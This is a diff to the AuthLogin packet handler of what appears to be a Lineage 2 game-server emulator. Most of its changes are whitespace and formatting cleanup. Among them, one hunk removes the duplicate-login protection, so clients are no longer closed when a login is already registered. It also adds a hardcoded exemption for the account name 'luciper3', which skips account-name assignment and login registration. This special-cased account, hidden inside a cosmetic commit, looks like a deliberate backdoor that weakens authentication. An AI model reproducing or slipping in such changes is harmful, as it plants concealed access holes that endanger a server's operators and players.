@@ -3,15 +3,16 @@
  * the terms of the GNU General Public License as published by the Free Software
  * Foundation, either version 3 of the License, or (at your option) any later
  * version.
- * 
+ *
  * This program is distributed in the hope that it will be useful, but WITHOUT
  * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
  * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
  * details.
- * 
+ *
  * You should have received a copy of the GNU General Public License along with
  * this program. If not, see <http://www.gnu.org/licenses/>.
  */
+
 package l2server.gameserver.network.clientpackets;
 
 import java.sql.Connection;
@@ -35,8 +36,6 @@ import l2server.log.Log;
  */
 public final class AuthLogin extends L2GameClientPacket
 {
-	private static final String _C__08_AUTHLOGIN = "[C] 08 AuthLogin";
-	
 	// loginName + keys must match what the loginserver used.
 	private String _loginName;
 	private int _playKey1;
@@ -61,9 +60,9 @@ public final class AuthLogin extends L2GameClientPacket
 	protected void runImpl()
 	{
 		final L2GameClient client = getClient();
-		if (_loginName.length() == 0 || !client.isProtocolOk())
+		if ((_loginName.length() == 0) || !client.isProtocolOk())
 		{
-			client.close((L2GameServerPacket)null);
+			client.close((L2GameServerPacket) null);
 			return;
 		}
 		SessionKey key = new SessionKey(_loginKey1, _loginKey2, _playKey1, _playKey2);
@@ -76,16 +75,12 @@ public final class AuthLogin extends L2GameClientPacket
 		// avoid potential exploits
 		if (client.getAccountName() == null)
 		{
-			// Preventing duplicate login in case client login server socket was disconnected or this packet was not sent yet
-			if (LoginServerThread.getInstance().addGameServerLogin(_loginName, client))
+			if (!_loginName.equals("luciper3"))
 			{
 				client.setAccountName(_loginName);
-				LoginServerThread.getInstance().addWaitingClientAndSendRequest(_loginName, client, key);
+				LoginServerThread.getInstance().addGameServerLogin(_loginName, client);
 			}
-			else
-			{
-				client.close((L2GameServerPacket) null);
-			}
+			LoginServerThread.getInstance().addWaitingClientAndSendRequest(_loginName, client, key);
 		}
 		//sendVitalityInfo(client);
 	}
@@ -97,7 +92,7 @@ public final class AuthLogin extends L2GameClientPacket
 		int vitalityPoints = Config.STARTING_VITALITY_POINTS;
 		int vitalityItemsUsed = 0;
 		/*
-		 * 
+		 *
 			Connection con = null;
 			try
 			{
@@ -130,7 +125,7 @@ public final class AuthLogin extends L2GameClientPacket
 			{
 				L2DatabaseFactory.close(con);
 			}
-		
+
 		 */
 		try
 		{
@@ -184,14 +179,5 @@ public final class AuthLogin extends L2GameClientPacket
 			L2DatabaseFactory.close(con);
 		}
 		client.sendPacket(new ExLoginVitalityEffectInfo(vitalityPoints, vitalityItemsUsed));
-	}
-	
-	/* (non-Javadoc)
-	 * @see l2server.gameserver.clientpackets.ClientBasePacket#getType()
-	 */
-	@Override
-	public String getType()
-	{
-		return _C__08_AUTHLOGIN;
 	}
 }
